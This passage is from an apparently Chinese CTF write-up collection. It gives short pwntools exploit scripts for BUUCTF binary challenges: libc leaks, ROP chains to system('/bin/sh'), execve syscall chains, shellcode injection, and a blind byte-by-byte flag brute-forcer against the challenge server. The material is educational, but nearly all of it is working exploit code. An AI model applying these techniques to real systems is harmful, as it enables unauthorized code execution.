<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">exit</span><span class="params">()</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;0&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span><span class="params">(index: <span class="type">int</span>, value: <span class="type">int</span>)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;edit: &quot;</span>, str(index).encode())</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;many? &quot;</span>, str(value).encode())</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(index: <span class="type">int</span>)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;show: &quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">sla</span><span class="params">(b<span class="string">&quot;name? &quot;</span>, b<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line"><span class="title function_">show</span><span class="params">(<span class="number">18</span>)</span></span><br><span class="line"><span class="title function_">ru</span><span class="params">(b<span class="string">&quot;is &quot;</span>)</span></span><br><span class="line">libc_base = <span class="type">int</span>(rld()) + (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">247</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>] - (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)) - (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">edit(<span class="number">14</span>, system_addr)</span><br><span class="line">edit(<span class="number">16</span>, bin_sh_addr)</span><br><span class="line"><span class="built_in">exit</span>()</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="inndy-stack"><a href="#inndy-stack" class="headerlink" title="inndy_stack"></a>inndy_stack</h3><p>模拟了一个stack,但是我们可以利用pop,push来覆盖掉index使它指向ret add,然后泄露libc进而覆盖返回地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop()</span><br><span class="line">pop()</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(<span class="number">93</span>)</span><br><span class="line">pop()</span><br><span class="line">ru(b<span class="string">&quot;Pop -&gt; &quot;</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(rld()) + (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>] - <span class="number">0xF7</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>] - (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)) - (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">push(system_addr)</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(bin_sh_addr)</span><br><span class="line">sla(b<span class="string">&quot;Cmd &gt;&gt;\n&quot;</span>, b<span class="string">&quot;x&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="cscctf-2019-qual-babystack"><a href="#cscctf-2019-qual-babystack" class="headerlink" title="cscctf_2019_qual_babystack"></a>cscctf_2019_qual_babystack</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cscctf_2019_qual_babystack">BUUCTF在线评测</a></p>
<p>挺不错的题目，在有限的plt 泄露libc getshell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pop_three_ret = <span class="number">0x08048519</span></span><br><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x14</span></span><br><span class="line">    + p32(elf.plt[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p32(pop_three_ret)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(elf.got[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p32(<span class="number">1</span>)</span><br><span class="line">    + p32(elf.plt[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p32(pop_three_ret)</span><br><span class="line">    + p32(<span class="number">1</span>)</span><br><span class="line">    + p32(elf.got[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p32(<span class="number">4</span>)</span><br><span class="line">    + p32(elf.plt[<span class="string">&quot;read&quot;</span>] + <span class="number">6</span>)</span><br><span class="line">    + p32(pop_three_ret)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(<span class="number">0x804A020</span>)</span><br><span class="line">    + p32(<span class="number">1</span>)</span><br><span class="line">    + p32(elf.sym[<span class="string">&quot;vuln&quot;</span>])</span><br><span class="line">)</span><br><span class="line">s(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(b<span class="string">&quot;\xf0&quot;</span>)</span><br><span class="line">libc_base = u32(ru(b<span class="string">&quot;\xf7&quot;</span>)) - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">s(b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span> * <span class="number">0x14</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">s(payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="强网杯2019-拟态-STKOF"><a href="#强网杯2019-拟态-STKOF" class="headerlink" title="强网杯2019 拟态 STKOF"></a>强网杯2019 拟态 STKOF</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20%E6%8B%9F%E6%80%81%20STKOF">BUUCTF在线评测</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;debug&quot;</span> in elf_path:</span><br><span class="line">    libc_path = elf.linker.decode().replace(<span class="string">&quot;ld&quot;</span>, <span class="string">&quot;./libc&quot;</span>)</span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x3A80C</span>, <span class="number">0x3A80E</span>, <span class="number">0x3A812</span>, <span class="number">0x3A819</span>, <span class="number">0x5F065</span>, <span class="number">0x5F066</span>]</span><br><span class="line">    elif <span class="string">&quot;2.27&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [</span><br><span class="line">            <span class="number">0x3CBEA</span>,</span><br><span class="line">            <span class="number">0x3CBEC</span>,</span><br><span class="line">            <span class="number">0x3CBF0</span>,</span><br><span class="line">            <span class="number">0x3CBF7</span>,</span><br><span class="line">            <span class="number">0x6729F</span>,</span><br><span class="line">            <span class="number">0x672A0</span>,</span><br><span class="line">            <span class="number">0x13573E</span>,</span><br><span class="line">            <span class="number">0x13573F</span>,</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_gadget = []</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">26525</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> libc_path != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        io = process(elf_path, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x400B32</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">32b</span>it overfollw <span class="number">110</span></span><br><span class="line"># <span class="number">64b</span>it overfollw <span class="number">118</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000405895</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005F6</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000043B9D5</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000043B97C</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004011DC</span></span><br><span class="line">bss_addr = <span class="number">0x6A3368</span></span><br><span class="line">read_64_addr = <span class="number">0x43B9C0</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080A8AF6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806E9F1</span></span><br><span class="line">int80_addr = <span class="number">0x080495A3</span></span><br><span class="line">add_esp_88_ret = <span class="number">0x0806F5AD</span></span><br><span class="line">read_32_addr = <span class="number">0x0806C8E0</span></span><br><span class="line">bss_32_addr = <span class="number">0x80DA354</span></span><br><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x110</span></span><br><span class="line">    + p32(add_esp_88_ret)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(pop_rsi_ret)</span><br><span class="line">    + p64(bss_addr)</span><br><span class="line">    + p64(pop_rdx_ret)</span><br><span class="line">    + p64(<span class="number">0x10</span>)</span><br><span class="line">    + p64(read_64_addr)</span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(bss_addr)</span><br><span class="line">    + p64(pop_rsi_ret)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(pop_rdx_ret)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(pop_rax_ret)</span><br><span class="line">    + p64(<span class="number">59</span>)</span><br><span class="line">    + p64(syscall_addr)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    payload.ljust(<span class="number">0x110</span> + <span class="number">0x80</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    + p32(read_32_addr)</span><br><span class="line">    + p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(bss_32_addr)</span><br><span class="line">    + p32(<span class="number">0x10</span>)</span><br><span class="line">    + p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(bss_32_addr)</span><br><span class="line">    + p32(pop_eax_ret)</span><br><span class="line">    + p32(<span class="number">0xB</span>)</span><br><span class="line">    + p32(int80_addr)</span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;pwn it?\n&quot;</span>, payload)</span><br><span class="line">sl(b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>关键就是利用add esp抬升栈</p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="铁人三项-第五赛区-2018-seven"><a href="#铁人三项-第五赛区-2018-seven" class="headerlink" title="铁人三项(第五赛区)_2018_seven"></a>铁人三项(第五赛区)_2018_seven</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_seven">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>题目还行·，就是要利用条件，有的时候rsp会在rip上面，那么就可以写道rsp里面覆盖返回的指令</p>
<p>push rsp</p>
<p>pop rsi</p>
<p>这里好像write不能特别大的值</p>
<p>所以就只能mov dx,si</p>
<p>syscall</p>
<p>然后算好偏移加上shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">push rsp;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">mov dx,si;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">sa(b<span class="string">&quot;shellcode:&quot;</span>, <span class="keyword">asm</span>(shellcode))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="keyword">asm</span>(<span class="string">&quot;nop&quot;</span>) * <span class="number">0xB37</span> + <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-echo1"><a href="#pwnable-echo1" class="headerlink" title="pwnable_echo1"></a>pwnable_echo1</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_echo1">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>傻逼题，就是需要往bss里面写入一个jmp rsp的指令，然后就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(b<span class="string">&quot;? : &quot;</span>, <span class="keyword">asm</span>(<span class="string">&quot;jmp rsp&quot;</span>))</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(b<span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(<span class="number">0x6020A0</span>) + <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="xman-2019-nooocall"><a href="#xman-2019-nooocall" class="headerlink" title="xman_2019_nooocall"></a>xman_2019_nooocall</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#xman_2019_nooocall">BUUCTF在线评测</a></p>
<p>这道题本来很简单，但由于禁用了所有的syscall,但是我们可以获取到flag的位置，就利用盲注来进行打</p>
<p>如果成功了就会陷入循环</p>
<p>挺有新意的题目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">flagstr = []</span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    flagstr.append(str(x))</span><br><span class="line"><span class="keyword">for</span> x in range(ord(<span class="string">&quot;a&quot;</span>), ord(<span class="string">&quot;z&quot;</span>) + <span class="number">1</span>):</span><br><span class="line">    flagstr.append(chr(x))</span><br><span class="line">flagstr.append(<span class="string">&quot;&#123;&quot;</span>)</span><br><span class="line">flagstr.append(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">flagstr.append(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">remote_port = <span class="number">25224</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;cb3e8ca2-759a-4865-b75e-8b9a276045b&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">40</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s in flagstr:</span><br><span class="line">        io = remote(remote_ip, remote_port)</span><br><span class="line">        payload = <span class="keyword">asm</span>(f<span class="string">&quot;mov rax,[rsp+0x18];mov al,byte ptr[rax+&#123;i&#125;];cmp al,&#123;ord(s)&#125;;&quot;</span>)</span><br><span class="line">        payload += b<span class="string">&quot;\x74&quot;</span> + p8(-len(payload) - <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">8</span>))</span><br><span class="line">        io.sendafter(b<span class="string">&quot;Shellcode &gt;&gt;&quot;</span>, payload)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;the monitored command dumped core\n&quot;</span> in io.recvline(timeout=<span class="number">1</span>):</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="tiny-backdoor-v1-hackover-2016"><a href="#tiny-backdoor-v1-hackover-2016" class="headerlink" title="tiny_backdoor_v1_hackover_2016"></a>tiny_backdoor_v1_hackover_2016</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#tiny_backdoor_v1_hackover_2016">BUUCTF在线评测</a></p>
<p>利用上下文寄存器条件调用sys_read然后插入shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bytess = b<span class="string">&quot;\xb3\x91\x7f\xdd\x62\x81\x11\x6a\x90&quot;</span></span><br><span class="line">shellcode = <span class="keyword">asm</span>(<span class="string">&quot;dec eax;xchg rdi,rdx;syscall;&quot;</span>)</span><br><span class="line">output = b<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(shellcode)):</span><br><span class="line">    output += p8(shellcode[i] ^ bytess[i])</span><br><span class="line">s(output)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="inndy-onepunch"><a href="#inndy-onepunch" class="headerlink" title="inndy_onepunch"></a>inndy_onepunch</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_onepunch">BUUCTF在线评测</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843015453-b3fd7b3e-1ab5-43f4-a0aa-7c601cff3979.png#averageHue=%23f9f9f9&clientId=u9d5fd636-f51f-4&from=paste&height=96&id=udb5109a7&originHeight=120&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19396&status=done&style=none&taskId=ufa7a650e-2f36-4fc7-b9f9-82da63267fe&title=&width=804.8" alt="image.png"></p>
<p>遇见每个题目要分析具体的情况，这里可以直接修改 text，我们先改成一个死循环，然后再慢慢写shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">writeData</span><span class="params">(addr, data)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Where What?&quot;</span>, (hex(addr) + <span class="string">&quot; &quot;</span> + str(data)).encode())</span></span><br><span class="line"><span class="title function_">writeData</span><span class="params">(<span class="number">0x400768</span>, u8(b<span class="string">&quot;\xb4&quot;</span>))</span></span><br><span class="line">shellcode = <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">start_addr = <span class="number">0x400769</span></span><br><span class="line"><span class="keyword">for</span> i in shellcode:</span><br><span class="line">    writeData(start_addr, i)</span><br><span class="line">    start_addr += <span class="number">1</span></span><br><span class="line">writeData(<span class="number">0x400767</span>, u8(b<span class="string">&quot;\x74&quot;</span>))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="inndy-leave-msg"><a href="#inndy-leave-msg" class="headerlink" title="inndy_leave_msg"></a>inndy_leave_msg</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_leave_msg">BUUCTF在线评测</a></p>
<p>不错的题目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sa(b<span class="string">&quot;message:\n&quot;</span>, <span class="keyword">asm</span>(<span class="string">&quot;add esp,0x35;jmp esp&quot;</span>) + b<span class="string">&quot;\x00\xc3&quot;</span> + <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">sa(b<span class="string">&quot;message slot?\n&quot;</span>, b<span class="string">&quot; -16&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="csaw2018-shell-code"><a href="#csaw2018-shell-code" class="headerlink" title="csaw2018_shell_code"></a>csaw2018_shell_code</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#csaw2018_shell_code">BUUCTF在线评测</a></p>
<p>shellcode跳转，合理利用寄存器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bin_sh = <span class="number">0x68732F2F6E69622F</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">mov rax,0x68732F2F6E69622F;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">jmp rsp;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">push rsi;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">push rsi;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">push 0x3b;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;node 1:  \n&quot;</span>, <span class="keyword">asm</span>(shellcode))</span><br><span class="line">sla(b<span class="string">&quot;node 2: \n&quot;</span>, b<span class="string">&quot;&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;node.next: &quot;</span>)</span><br><span class="line">stack_addr = <span class="type">int</span>(rld(), <span 